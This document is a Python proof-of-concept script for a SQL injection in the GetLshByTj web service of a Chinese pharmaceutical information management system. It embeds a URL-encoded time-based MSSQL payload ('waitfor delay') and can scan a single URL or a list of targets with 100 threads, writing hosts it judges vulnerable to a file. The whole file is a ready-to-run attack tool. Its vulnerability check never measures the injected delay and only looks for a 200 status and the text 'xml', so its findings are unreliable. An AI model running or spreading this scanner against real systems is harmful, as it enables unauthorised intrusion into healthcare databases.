import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
     _____ _____ _____  _     ____  _     ____ ___  _ _____   _ 
/  __//  __//__ __\/ \   / ___\/ \ /|/  __\\  \///__ __\ / |
| |  _|  \    / \  | |   |    \| |_||| | // \  /   / \   | |
| |_//|  /_   | |  | |_/\\___ || | ||| |_\\ / /    | |/\_| |
\____\\____\  \_/  \____/\____/\_/ \|\____//_/     \_/\____/
                                                made by @wongxy
                                                sql


"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="医药信息管理系统GetLshByTj存在SQL注入")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a%33%27%2d%2d%20%2d&redonly=true&tjstr=12"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',

    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=15)
        if res1.status_code == 200 and "xml" in res1.text:
            logger.info(f"[+] {target} 存在漏洞")
            with open('getre.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
                f.close()
            return True
        else:
            logger.info(f"[-] {target} 不存在漏洞")
            return False
    except Exception as e:
        logger.error(f"[-] {target} 连接失败")
        return False


if __name__ == '__main__':
    main()
